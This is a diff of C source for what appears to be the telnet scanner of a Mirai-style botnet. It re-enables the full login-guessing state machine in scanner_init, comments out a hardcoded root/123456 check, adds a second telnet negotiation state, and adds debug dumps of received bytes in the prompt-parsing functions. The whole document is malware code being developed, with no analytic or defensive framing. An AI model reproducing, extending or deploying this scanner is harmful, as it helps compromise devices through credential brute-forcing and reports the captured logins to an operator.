@@ -444,13 +444,14 @@ void scanner_init(void)
                     conn->last_recv = fake_time;
 
 
+                    /*
                     if (strcmp("root", conn->auth->username) == 0 && 0 == strcmp("123456", conn->auth->password)) {
                         if (report_flag == 0) {
                             report_working(conn->dst_addr, conn->dst_port, conn->auth);
                             report_flag = 1;
                         }
-                    }
-                    /*
+                    }*/
+
                     while (TRUE)
                     {
                         int consumed = 0;
@@ -460,9 +461,18 @@ void scanner_init(void)
                         case SC_HANDLE_IACS:
                             if ((consumed = consume_iacs(conn)) > 0)
                             {
+                                conn->state = SC_HANDLE_IACS_2;
+#ifdef DEBUG
+                                printf("[scanner] FD%d finished telnet negotiation 1\n", conn->fd);
+#endif
+                            }
+                            break;
+						case SC_HANDLE_IACS_2:
+                            if ((consumed = consume_iacs(conn)) > 0)
+                            {
                                 conn->state = SC_WAITING_USERNAME;
 #ifdef DEBUG
-                                printf("[scanner] FD%d finished telnet negotiation\n", conn->fd);
+                                printf("[scanner] FD%d finished telnet negotiation 2\n", conn->fd);
 #endif
                             }
                             break;
@@ -641,7 +651,6 @@ void scanner_init(void)
                             memmove(conn->rdbuf, conn->rdbuf + consumed, conn->rdbuf_pos);
                         }
                     }
-                    */
                 }
             }
         }
@@ -798,6 +807,13 @@ static int consume_any_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
+#ifdef LVSJ
+	for (int j = 0; j < conn->rdbuf_pos; j++) {
+		printf("+%d+ ", conn->rdbuf[j]);
+	}
+	printf("any_prompt\n");
+#endif
+
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#' || conn->rdbuf[i] == '%')
@@ -817,6 +833,13 @@ static int consume_user_prompt(struct scanner_connection *conn)
 {
     char *pch;
     int i, prompt_ending = -1;
+
+#ifdef LVSJ
+	for (int j = 0; j < conn->rdbuf_pos; j++) {
+		printf("+%d+ ", conn->rdbuf[j]);
+	}
+	printf("user_prompt\n");
+#endif
 
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
@@ -848,6 +871,13 @@ static int consume_pass_prompt(struct scanner_connection *conn)
     char *pch;
     int i, prompt_ending = -1;
 
+#ifdef LVSJ
+	for (int j = 0; j < conn->rdbuf_pos; j++) {
+		printf("+%d+ ", conn->rdbuf[j]);
+	}
+	printf("pass_prompt\n");
+#endif
+
     for (i = conn->rdbuf_pos - 1; i > 0; i--)
     {
         if (conn->rdbuf[i] == ':' || conn->rdbuf[i] == '>' || conn->rdbuf[i] == '$' || conn->rdbuf[i] == '#')
@@ -875,6 +905,13 @@ static int consume_resp_prompt(struct scanner_connection *conn)
 {
     char *tkn_resp;
     int prompt_ending, len;
+
+#ifdef LVSJ
+	for (int j = 0; j < conn->rdbuf_pos; j++) {
+		printf("+%d+ ", conn->rdbuf[j]);
+	}
+	printf("resp_prompt\n");
+#endif
 
     table_unlock_val(TABLE_SCAN_NCORRECT);
     tkn_resp = table_retrieve_val(TABLE_SCAN_NCORRECT, &len);
